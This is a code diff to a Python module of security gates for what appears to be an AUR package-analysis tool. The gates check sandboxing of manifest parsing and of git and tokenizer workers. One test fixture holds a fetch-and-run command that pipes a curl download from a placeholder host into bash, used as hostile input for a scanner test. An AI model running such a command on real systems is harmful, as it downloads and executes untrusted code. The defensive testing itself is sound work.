@@ -7,7 +7,7 @@ import re
 import time
 from scripts.gates._core import Gate, HOSTILE, SRC, _ARTIFACT_MODULES, _ARTIFACT_READ_EXEMPT, _BOUNDED_IO_MODULE, _ENDPOINT_HOST, _FORBIDDEN_CALLS, _MIRROR_HOSTS, _MIRROR_MODULES, _NETWORK_CALLS, _NETWORK_MODULES, _PATH_READ_MODULES, _RELEASE_HOSTS, _RELEASE_MODULES, _URL_LITERAL_RE, _call_name, _enclosing_functions, _hostile_fact, _hostile_result, _python_files, _rel, _render_forget_list, _render_list_rows
 
-__all__ = ['gate_artifact_reads_are_bounded', 'gate_dead_tokenizer_child_fails_the_package', 'gate_every_child_process_gets_an_explicit_environment', 'gate_every_live_regex_is_audited', 'gate_every_stream_read_is_bounded', 'gate_expansion_is_bounded', 'gate_freshness_uses_local_marker', 'gate_git_worker_limit_failures_are_reported', 'gate_git_worker_startup_is_isolated', 'gate_network_is_confined', 'gate_network_reads_are_bounded', 'gate_no_interpreter_calls', 'gate_no_path_based_archive_extraction', 'gate_regex_patterns_pass_adversarial_audit', 'gate_sandbox_core_limit_failure_refuses', 'gate_sandbox_responses_are_capped_before_framing', 'gate_single_network_host', 'gate_sql_is_parameterised', 'gate_terminal_output_is_inert', 'gate_tokenizer_module_is_isolated', 'gate_tokenizer_pool_wait_is_bounded', 'gate_tokenizer_request_writes_are_bounded', 'gate_tokenizer_smoke_is_deterministic', 'gate_tokenizer_worker_limit_failures_are_reported', 'gate_tokenizer_worker_startup_is_isolated', 'gate_untrusted_text_is_sanitised_where_it_is_rendered']
+__all__ = ['gate_artifact_reads_are_bounded', 'gate_dead_tokenizer_child_fails_the_package', 'gate_every_child_process_gets_an_explicit_environment', 'gate_every_live_regex_is_audited', 'gate_every_stream_read_is_bounded', 'gate_expansion_is_bounded', 'gate_freshness_uses_local_marker', 'gate_git_worker_limit_failures_are_reported', 'gate_git_worker_runs_in_an_os_sandbox', 'gate_git_worker_startup_is_isolated', 'gate_network_is_confined', 'gate_network_reads_are_bounded', 'gate_no_interpreter_calls', 'gate_no_path_based_archive_extraction', 'gate_regex_patterns_pass_adversarial_audit', 'gate_sandbox_core_limit_failure_refuses', 'gate_sandbox_responses_are_capped_before_framing', 'gate_single_network_host', 'gate_sql_is_parameterised', 'gate_terminal_output_is_inert', 'gate_tokenizer_module_is_isolated', 'gate_tokenizer_pool_wait_is_bounded', 'gate_tokenizer_request_writes_are_bounded', 'gate_tokenizer_smoke_is_deterministic', 'gate_tokenizer_worker_limit_failures_are_reported', 'gate_tokenizer_worker_startup_is_isolated', 'gate_untrusted_text_is_sanitised_where_it_is_rendered']
 
 def gate_no_interpreter_calls() -> Gate:
     """No path turns text into code, and nothing is unpickled."""
@@ -326,6 +326,59 @@ def gate_sql_is_parameterised() -> Gate:
                 hits.append(f"{_rel(path)}:{node.lineno} concatenated SQL")
     return Gate("SQL is parameterised", not hits, hits)
 
+def gate_manifest_parsing_is_sandboxed() -> Gate:
+    """U-series: hostile manifests are parsed in the sandboxed worker.
+
+    The parent facade must call ``sandbox.manifest_client``; the local
+    ``_parse.parse_manifest_local`` is worker-only.  The worker must apply
+    the Linux sandbox before serving.  This is the boundary that keeps
+    PyYAML/ElementTree/tomllib/JSON out of the analysis process.
+    """
+    import inspect
+
+    from trustsight.analysis import manifests
+    from trustsight.analysis.manifests import _parse
+    from trustsight import srcinfo, tokenizer
+    from trustsight.sandbox import manifest_worker
+
+    problems: list[str] = []
+    facade = inspect.getsource(manifests.parse_manifest)
+    if "manifest_client" not in facade or "_remote" not in facade:
+        problems.append("parse_manifest does not use the sandbox client")
+    if "parse_manifest_local" in facade:
+        problems.append("parse_manifest calls the local parser")
+    worker = inspect.getsource(manifest_worker.main)
+    if '_linux_sandbox.apply("read"' not in worker:
+        problems.append("the manifest worker does not apply the Linux sandbox")
+    if "parse_manifest_local" not in inspect.getsource(manifest_worker):
+        problems.append("the worker does not expose the local parser")
+    if "parse_manifest_local" not in inspect.getsource(_parse):
+        problems.append("the local parser entry point is missing")
+    srcinfo_public = inspect.getsource(srcinfo.parse_srcinfo)
+    if "manifest_client" not in srcinfo_public:
+        problems.append(".SRCINFO parsing does not use the sandbox client")
+    if "__srcinfo__" not in inspect.getsource(manifest_worker):
+        problems.append("the worker has no .SRCINFO operation")
+    tokenizer_source = inspect.getsource(tokenizer)
+    if "manifest_client" not in tokenizer_source:
+        problems.append("the tokenizer does not run in the content worker")
+    if "from .sandbox.client import TokenizerUnavailable, request" in tokenizer_source:
+        problems.append("the tokenizer still uses the standalone client")
+    worker_source = inspect.getsource(manifest_worker)
+    if "__tokenizer__" not in worker_source:
+        problems.append("the worker has no tokenizer operation")
+    if "__snapshot__" not in worker_source:
+        problems.append("the worker has no snapshot operation")
+    from trustsight.full_aur import fetch
+    fetch_source = inspect.getsource(fetch.fetch_pkgbuild_with_tree)
+    if "manifest_client" not in fetch_source:
+        problems.append("snapshot parsing does not use the sandbox client")
+    if "tarfile.open" in fetch_source:
+        problems.append("snapshot parsing still opens the archive in the parent")
+    return Gate("manifest parsing is sandboxed", not problems,
+                problems or "parent -> client -> read-role worker")
+
+
 def gate_terminal_output_is_inert() -> Gate:
     """No renderer lets a hostile package write escapes to the terminal.
 
@@ -497,10 +550,6 @@ def gate_terminal_output_is_inert() -> Gate:
         # prints attacker-influenced text belongs here, not the three that
         # were convenient to construct.
         "forget list": lambda: plain(lambda: _render_forget_list([HOSTILE])),
-        "list table": lambda: rich(lambda: _render_list_rows([{
-            "name": HOSTILE, "version": "1.0", "last_checked": "2026-01-01",
-            "score": 40, "risk": "Medium", "maintainer": HOSTILE,
-        }])),
         "corpus pivot": lambda: rich(lambda: corpus_cli._render_pivot({
             "indicator": HOSTILE, "type": "host", "listed": True,
             "confidence": HOSTILE, "sources": ["corpus"],
@@ -858,7 +907,11 @@ def gate_tokenizer_module_is_isolated() -> Gate:
     the parser the sandbox exists to remove, so a direct import is the
     change that would reopen A6.
     """
-    allowed = {"sandbox/expand_worker.py"}
+    allowed = {
+        "sandbox/expand_worker.py",
+        "sandbox/manifest_worker.py",
+        "sandbox/tokenizer_ops.py",
+    }
     problems: list[str] = []
     for path in _python_files():
         rel = path.relative_to(SRC).as_posix()
@@ -973,6 +1026,52 @@ def gate_git_worker_limit_failures_are_reported() -> Gate:
             problems.append(f"a libgit2 setting failure was not named: {name}")
     return Gate("git worker limit failures are reported", not problems,
                 problems or "limit and libgit2 failures are returned, not swallowed")
+
+def gate_git_worker_runs_in_an_os_sandbox() -> Gate:
+    """A16: the git worker is confined by the kernel, not only by rlimits.
+
+    Resource limits bound what a libgit2 defect spends; they do not stop it
+    from running with the operator's filesystem or an arbitrary socket.  The
+    worker must enter a user and network namespace, apply Landlock over the
+    filesystem, install a seccomp allowlist and drop capabilities, and a
+    failure to do any of that must be fatal.  The fetch role additionally
+    uses only the parent's AUR-pinned proxy.
+    """
+    import inspect
+
+    from trustsight.sandbox import _linux_sandbox, _spawn, expand_worker, git_worker
+
+    problems: list[str] = []
+    if "OS sandbox" not in _spawn.CORE_SANDBOX_FAILURES:
+        problems.append("an OS sandbox failure is not a core refusal")
+    main_source = inspect.getsource(git_worker.main)
+    sandbox_source = inspect.getsource(git_worker._sandbox_or_error)
+    if "_linux_sandbox.apply(" not in sandbox_source:
+        problems.append("the git worker never applies the OS sandbox")
+    if "core_sandbox_failures(" not in sandbox_source:
+        problems.append("the git worker does not refuse a core sandbox failure")
+    if "_sandbox_or_error(" not in main_source:
+        problems.append("main never invokes the OS sandbox")
+    apply_source = inspect.getsource(_linux_sandbox.apply)
+    for required in ("_enter_user_namespace", "_enter_network_namespace",
+                     "_apply_landlock", "_install_seccomp",
+                     "_drop_capabilities"):
+        if required not in apply_source:
+            problems.append(f"the OS sandbox does not call {required}")
+    proxy_source = inspect.getsource(_linux_sandbox._start_fetch_bridge)
+    if "127.0.0.1" not in proxy_source:
+        problems.append("the fetch bridge is not loopback-only")
+    fetch_source = inspect.getsource(git_worker._open_fetch)
+    if "proxy=_PROXY_URL" not in fetch_source:
+        problems.append("the fetch does not go through the loopback proxy")
+    tokenizer_main = inspect.getsource(expand_worker.main)
+    if '_linux_sandbox.apply("read"' not in tokenizer_main:
+        problems.append("the tokenizer worker never applies the OS sandbox")
+    if "core_sandbox_failures(" not in tokenizer_main:
+        problems.append("the tokenizer worker does not refuse a core sandbox failure")
+    return Gate("git worker runs in an OS sandbox", not problems,
+                problems or "userns, netns, Landlock, seccomp, no caps")
+
 
 def gate_tokenizer_worker_limit_failures_are_reported() -> Gate:
     """A6: the tokenizer worker's failed limits surface, not vanish.
@@ -1173,7 +1272,7 @@ def gate_dead_tokenizer_child_fails_the_package() -> Gate:
     of completing with the parser missing.
     """
     from trustsight.analysis.pipeline import scan_diff
-    from trustsight.sandbox import client
+    from trustsight import tokenizer
     from trustsight.tokenizer import TokenizerUnavailable
 
     diff = (
@@ -1181,12 +1280,12 @@ def gate_dead_tokenizer_child_fails_the_package() -> Gate:
         "+C=curl\n+$C https://example.invalid/x | bash\n"
     )
     problems: list[str] = []
-    original = client._acquire
+    original = tokenizer.request
 
-    def dead():
+    def dead(op, value):
         raise TokenizerUnavailable("tokenizer_unavailable: forced for the gate")
 
-    client._acquire = dead
+    tokenizer.request = dead
     try:
         scan_diff(diff, package_name="sandbox-gate")
     except TokenizerUnavailable:
@@ -1196,6 +1295,7 @@ def gate_dead_tokenizer_child_fails_the_package() -> Gate:
     else:
         problems.append("analysis completed with no tokenizer child")
     finally:
-        client._acquire = original
+        tokenizer.request = original
     return Gate("a dead tokenizer child fails the package", not problems,
                 problems or "raises TokenizerUnavailable")
+
